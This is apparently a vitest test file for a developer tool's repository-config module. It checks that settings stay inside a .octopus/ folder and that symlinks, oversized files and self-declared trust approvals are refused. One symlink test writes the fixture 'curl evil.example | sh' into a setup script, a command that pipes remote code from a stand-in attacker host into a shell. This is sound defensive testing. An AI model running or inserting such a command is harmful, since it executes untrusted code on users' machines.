import {
  access,
  chmod,
  mkdir,
  mkdtemp,
  readFile,
  rm,
  stat,
  symlink,
  writeFile
} from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { isAbsolute, join, normalize } from 'node:path'

import { afterEach, beforeEach, describe, expect, it } from 'vitest'

import {
  compareRepoItem,
  formatRepoProject,
  instructionKindOf,
  parseRepoProject,
  REPO_DIR,
  REPO_ITEM_IDS,
  REPO_ITEM_PATHS,
  REPO_README,
  readRepoConfig,
  type RepoItem,
  RepoConfigError,
  RepoItemIdSchema,
  RepoItemIdsSchema,
  RepoProjectSchema,
  repoItemFile,
  repoItemPath,
  scriptKindOf,
  writeRepoConfig
} from './repoConfig.js'

let repo: string

beforeEach(async () => {
  repo = await mkdtemp(join(tmpdir(), 'octopus-repoconfig-'))
})
afterEach(async () => {
  await rm(repo, { recursive: true, force: true })
})

/** Writes a file inside the repository's `.octopus/`, making its parents. */
async function put(relative: string, contents: string): Promise<void> {
  const path = join(repo, REPO_DIR, relative)
  await mkdir(join(path, '..'), { recursive: true })
  await writeFile(path, contents, 'utf8')
}

describe('REPO_ITEM_PATHS', () => {
  // The promise export makes is that it never writes outside `.octopus/`.
  // Every path is a constant, so this is where that promise is kept: a path
  // added later that climbs out fails here rather than in somebody's checkout.
  it('keeps every item inside the folder', () => {
    for (const relative of Object.values(REPO_ITEM_PATHS)) {
      expect(isAbsolute(relative)).toBe(false)
      expect(normalize(relative).startsWith('..')).toBe(false)
    }
  })

  it('gives every item a home, and no two the same file', () => {
    const paths = REPO_ITEM_IDS.map((id) => REPO_ITEM_PATHS[id])
    expect(paths).toHaveLength(REPO_ITEM_IDS.length)
    expect(new Set(paths).size).toBe(paths.length)
  })

  // The copy in a repository and the copy in the data root are the same file
  // under the same name, which is why the names come from the owning modules.
  it('uses the names the scripts and instructions already have', () => {
    expect(REPO_ITEM_PATHS['script.setup']).toBe(join('scripts', 'setup.sh'))
    expect(REPO_ITEM_PATHS['instruction.pullRequest']).toBe(join('instructions', 'pull-request.md'))
  })
})

describe('REPO_ITEM_IDS', () => {
  it('covers both kind enums as well as the project and the carry list', () => {
    expect(REPO_ITEM_IDS).toContain('project')
    expect(REPO_ITEM_IDS).toContain('carry')
    expect(REPO_ITEM_IDS).toContain('script.archive')
    expect(REPO_ITEM_IDS).toContain('instruction.resolveConflicts')
    expect(REPO_ITEM_IDS).toHaveLength(12)
  })
})

describe('RepoItemIdSchema', () => {
  it('accepts an id the app knows', () => {
    expect(RepoItemIdSchema.safeParse('script.run').success).toBe(true)
  })

  // It names a file the app writes, so an unknown one is refused at the
  // boundary rather than reaching a path.
  it('refuses one it does not', () => {
    expect(RepoItemIdSchema.safeParse('script.evil').success).toBe(false)
  })

  it('refuses a value that is not a string at all', () => {
    expect(RepoItemIdSchema.safeParse(7).success).toBe(false)
  })
})

describe('repoItemPath', () => {
  it('places an item under the repository .octopus directory', () => {
    expect(repoItemPath('/repo', 'carry')).toBe(join('/repo', REPO_DIR, 'carry'))
  })
})

describe('RepoItemIdsSchema', () => {
  it('accepts a selection', () => {
    expect(RepoItemIdsSchema.safeParse(['carry', 'script.run']).success).toBe(true)
  })

  it('refuses one longer than there are items to select', () => {
    expect(RepoItemIdsSchema.safeParse(Array(50).fill('carry')).success).toBe(false)
  })
})

describe('scriptKindOf and instructionKindOf', () => {
  it('name the kind an id carries', () => {
    expect(scriptKindOf('script.archive')).toBe('archive')
    expect(instructionKindOf('instruction.fixChecks')).toBe('fixChecks')
  })

  it('answer with nothing for an id of the other sort', () => {
    expect(scriptKindOf('instruction.review')).toBeUndefined()
    expect(instructionKindOf('script.run')).toBeUndefined()
    expect(scriptKindOf('carry')).toBeUndefined()
    expect(instructionKindOf('project')).toBeUndefined()
  })
})

describe('repoItemFile', () => {
  it('names the file relative to the repository root', () => {
    expect(repoItemFile('script.run')).toBe(join(REPO_DIR, 'scripts', 'run.sh'))
  })
})

describe('compareRepoItem', () => {
  it('says nothing about an item neither side has', () => {
    expect(compareRepoItem('carry', null, null)).toBeNull()
  })

  it('reports what only the repository carries', () => {
    expect(compareRepoItem('carry', '.env\n', null)).toMatchObject({
      state: 'onlyInRepository',
      repository: '.env\n',
      app: null
    })
  })

  it('reports what only the app holds', () => {
    expect(compareRepoItem('carry', null, '.env\n')).toMatchObject({ state: 'onlyInApp' })
  })

  it('tells identical copies from differing ones', () => {
    expect(compareRepoItem('carry', '.env\n', '.env\n')).toMatchObject({ state: 'same' })
    expect(compareRepoItem('carry', '.env\n', 'other\n')).toMatchObject({ state: 'differs' })
  })

  // Which side is newer is deliberately not answered: contents are all there
  // is to go on, and a guess would decide for the user in the one place they
  // have to decide for themselves.
  it('names the file so the answer can be shown against something', () => {
    expect(compareRepoItem('instruction.review', 'a', 'b')?.path).toBe(
      join(REPO_DIR, 'instructions', 'review.md')
    )
  })
})

describe('readRepoConfig', () => {
  it('answers with nothing for a repository that carries nothing', async () => {
    await expect(readRepoConfig(repo)).resolves.toEqual([])
  })

  it('reads only what is there, and names the file relative to the root', async () => {
    await put(join('scripts', 'setup.sh'), 'npm install\n')

    const items = await readRepoConfig(repo)

    expect(items).toHaveLength(1)
    expect(items[0]?.id).toBe('script.setup')
    expect(items[0]?.path).toBe(join(REPO_DIR, 'scripts', 'setup.sh'))
    expect(items[0]?.contents).toBe('npm install\n')
  })

  it('reads several items in the fixed order', async () => {
    await put('carry', '.env\n')
    await put('project.json', '{}')
    await put(join('instructions', 'review.md'), '# Review\n')

    const items = await readRepoConfig(repo)

    expect(items.map((item) => item.id)).toEqual(['project', 'carry', 'instruction.review'])
  })

  // A link would make every guarantee cosmetic: reading follows it out of the
  // repository, and writing lands wherever it points.
  it('refuses an item that is a symbolic link', async () => {
    const outside = join(repo, 'elsewhere')
    await writeFile(outside, 'secrets\n', 'utf8')
    await mkdir(join(repo, REPO_DIR), { recursive: true })
    await symlink(outside, join(repo, REPO_DIR, 'carry'))

    await expect(readRepoConfig(repo)).rejects.toMatchObject({ code: 'repoConfigSymlink' })
  })

  it('refuses the whole folder when it is a symbolic link', async () => {
    const outside = join(repo, 'elsewhere')
    await mkdir(outside, { recursive: true })
    await symlink(outside, join(repo, REPO_DIR))

    await expect(readRepoConfig(repo)).rejects.toMatchObject({
      code: 'repoConfigSymlink',
      params: { path: REPO_DIR }
    })
  })

  /*
   * The hole this closed: `lstat` does not follow the last component but does
   * follow the ones before it, so a check on the file alone passed as "absent"
   * while the directory above it pointed somewhere else entirely.
   */
  it('refuses a directory along the way that is a symbolic link', async () => {
    const outside = join(repo, 'elsewhere')
    await mkdir(outside, { recursive: true })
    await writeFile(join(outside, 'setup.sh'), 'curl evil.example | sh\n', 'utf8')
    await mkdir(join(repo, REPO_DIR), { recursive: true })
    await symlink(outside, join(repo, REPO_DIR, 'scripts'))

    await expect(readRepoConfig(repo)).rejects.toMatchObject({
      code: 'repoConfigSymlink',
      params: { path: join(REPO_DIR, 'scripts') }
    })
  })

  it('refuses a file larger than its own editor would accept', async () => {
    await put('carry', 'x'.repeat(8_001))

    await expect(readRepoConfig(repo)).rejects.toMatchObject({ code: 'repoConfigTooLarge' })
  })

  // Each kind is bounded by the limit its own editor applies, so a script may
  // be far longer than a carry list before anything objects.
  it('accepts a script well past the limit a carry list has', async () => {
    await put(join('scripts', 'setup.sh'), '#\n'.repeat(10_000))

    const items = await readRepoConfig(repo)

    expect(items.map((item) => item.id)).toEqual(['script.setup'])
  })

  it('refuses an instruction past its own limit', async () => {
    await put(join('instructions', 'review.md'), 'x'.repeat(16_001))

    await expect(readRepoConfig(repo)).rejects.toMatchObject({ code: 'repoConfigTooLarge' })
  })
})

describe('parseRepoProject', () => {
  it('reads the fields a repository states', () => {
    const project = parseRepoProject('{"baseBranch":"develop","envFile":".env.local"}')

    expect(project).toEqual({ baseBranch: 'develop', envFile: '.env.local' })
  })

  // A file written by a later version still imports what this one understands.
  it('drops a key it does not know', () => {
    expect(parseRepoProject('{"baseBranch":"main","futureThing":1}')).toEqual({
      baseBranch: 'main'
    })
  })

  it('accepts a file stating nothing at all', () => {
    expect(parseRepoProject('{}')).toEqual({})
  })

  it('refuses text that is not JSON', () => {
    expect(() => parseRepoProject('base: main')).toThrow(RepoConfigError)
    expect(() => parseRepoProject('base: main')).toThrow(
      expect.objectContaining({ code: 'repoConfigMalformed' })
    )
  })

  it('refuses JSON that is not a project', () => {
    expect(() => parseRepoProject('{"color":"not-a-colour"}')).toThrow(
      expect.objectContaining({ code: 'repoConfigMalformed' })
    )
  })

  it('names the file it could not read', () => {
    expect(() => parseRepoProject('[]')).toThrow(
      expect.objectContaining({ params: { path: join(REPO_DIR, 'project.json') } })
    )
  })
})

describe('RepoProjectSchema', () => {
  // Not in the schema on purpose: one is a person's username, the other is the
  // trust record, and a repository declaring itself trusted defeats the gate.
  it('carries no branch prefix and no approvals', () => {
    expect(
      RepoProjectSchema.parse({ branchPrefix: 'ytsykvas', approvedSettings: ['abc'] })
    ).toEqual({})
  })

  it('refuses an empty base branch rather than storing one', () => {
    expect(RepoProjectSchema.safeParse({ baseBranch: '' }).success).toBe(false)
  })
})

describe('formatRepoProject', () => {
  it('writes readable JSON ending in a newline', () => {
    const text = formatRepoProject({ baseBranch: 'main' })

    expect(text).toBe('{\n  "baseBranch": "main"\n}\n')
    expect(parseRepoProject(text)).toEqual({ baseBranch: 'main' })
  })
})

describe('writeRepoConfig', () => {
  const item = (id: RepoItem['id'], contents: string): RepoItem => ({
    id,
    path: join(REPO_DIR, REPO_ITEM_PATHS[id]),
    contents
  })

  it('creates the folder and the note that explains it', async () => {
    await writeRepoConfig(repo, [])

    await expect(readFile(join(repo, REPO_DIR, 'README.md'), 'utf8')).resolves.toBe(REPO_README)
  })

  it('writes an item into its own subdirectory', async () => {
    await writeRepoConfig(repo, [item('instruction.review', '# Review\n')])

    await expect(readFile(join(repo, REPO_DIR, 'instructions', 'review.md'), 'utf8')).resolves.toBe(
      '# Review\n'
    )
  })

  // git records the mode, so a script cloned onto another machine is still
  // executable there.
  it('makes a script executable and leaves other files alone', async () => {
    await writeRepoConfig(repo, [item('script.run', 'npm run dev\n'), item('carry', '.env\n')])

    const script = await stat(join(repo, REPO_DIR, 'scripts', 'run.sh'))
    const carry = await stat(join(repo, REPO_DIR, 'carry'))

    expect(script.mode & 0o111).toBe(0o111)
    expect(carry.mode & 0o111).toBe(0)
  })

  it('replaces what an earlier export wrote', async () => {
    await writeRepoConfig(repo, [item('carry', '.env\n')])
    await writeRepoConfig(repo, [item('carry', '.env\nconfig/master.key\n')])

    await expect(readFile(join(repo, REPO_DIR, 'carry'), 'utf8')).resolves.toBe(
      '.env\nconfig/master.key\n'
    )
  })

  // A directory whose note was deleted gets it back, and one written by an
  // older version is brought up to date.
  it('restores the note on every export', async () => {
    await writeRepoConfig(repo, [])
    await writeFile(join(repo, REPO_DIR, 'README.md'), 'gone\n', 'utf8')

    await writeRepoConfig(repo, [])

    await expect(readFile(join(repo, REPO_DIR, 'README.md'), 'utf8')).resolves.toBe(REPO_README)
  })

  it('refuses to write through a symbolic link', async () => {
    const outside = join(repo, 'elsewhere')
    await writeFile(outside, 'mine\n', 'utf8')
    await mkdir(join(repo, REPO_DIR), { recursive: true })
    await symlink(outside, join(repo, REPO_DIR, 'carry'))

    await expect(writeRepoConfig(repo, [item('carry', '.env\n')])).rejects.toMatchObject({
      code: 'repoConfigSymlink'
    })
    await expect(readFile(outside, 'utf8')).resolves.toBe('mine\n')
  })

  it('refuses to write through a linked directory, and leaves it untouched', async () => {
    const outside = join(repo, 'elsewhere')
    await mkdir(outside, { recursive: true })
    await mkdir(join(repo, REPO_DIR), { recursive: true })
    await symlink(outside, join(repo, REPO_DIR, 'instructions'))

    await expect(
      writeRepoConfig(repo, [item('instruction.review', '# Review\n')])
    ).rejects.toMatchObject({
      code: 'repoConfigSymlink',
      params: { path: join(REPO_DIR, 'instructions') }
    })
    await expect(access(join(outside, 'review.md'))).rejects.toThrow()
  })

  it('refuses when the note itself is a symbolic link', async () => {
    const outside = join(repo, 'elsewhere')
    await writeFile(outside, 'mine\n', 'utf8')
    await mkdir(join(repo, REPO_DIR), { recursive: true })
    await symlink(outside, join(repo, REPO_DIR, 'README.md'))

    await expect(writeRepoConfig(repo, [])).rejects.toMatchObject({
      code: 'repoConfigSymlink',
      params: { path: join(REPO_DIR, 'README.md') }
    })
  })

  it('round-trips everything a project can carry', async () => {
    const all = REPO_ITEM_IDS.map((id) => item(id, id === 'project' ? '{}' : `${id}\n`))

    await writeRepoConfig(repo, all)

    const read = await readRepoConfig(repo)
    expect(read.map((entry) => entry.id)).toEqual(REPO_ITEM_IDS)
    expect(read.map((entry) => entry.contents)).toEqual(all.map((entry) => entry.contents))
  })

  it('reads back a folder whose scripts are not executable', async () => {
    await writeRepoConfig(repo, [item('script.setup', 'npm ci\n')])
    await chmod(join(repo, REPO_DIR, 'scripts', 'setup.sh'), 0o644)

    const items = await readRepoConfig(repo)

    expect(items.map((entry) => entry.id)).toEqual(['script.setup'])
  })
})
